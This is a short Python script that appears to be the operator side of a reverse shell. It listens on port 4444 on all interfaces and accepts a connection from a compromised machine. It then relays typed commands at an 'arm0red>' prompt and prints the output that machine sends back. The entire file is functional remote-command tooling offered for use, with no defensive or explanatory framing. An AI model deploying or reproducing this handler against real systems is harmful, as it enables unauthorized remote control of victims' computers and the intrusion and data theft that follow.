#!/usr/bin/python3

from socket import *

HOST = '' # '' means bind to all interfaces
PORT = 4444 #  Port 

s = socket(AF_INET, SOCK_STREAM) # Create our socket handler
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port
s.bind((HOST, PORT)) # Bind to interface
print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections
s.listen(10) # Listen for only 10 connections
conn, addr = s.accept() # Accept connections
print("[+] Connected by", addr) # Print connected by ipaddress
data = conn.recv(1024).decode("UTF-8") # Receive initial connection

while 1: # Start loop
    command = input("arm0red> ") # Enter shell command
    conn.send(bytes(command, "UTF-8")) # Send shell command
    if command == "quit":
        break # If we specify quit then break out of loop and close socket
    data = conn.recv(1024).decode("UTF-8") # Receive output from command
    print(data) # Print the output of the command

conn.close() # Close socket
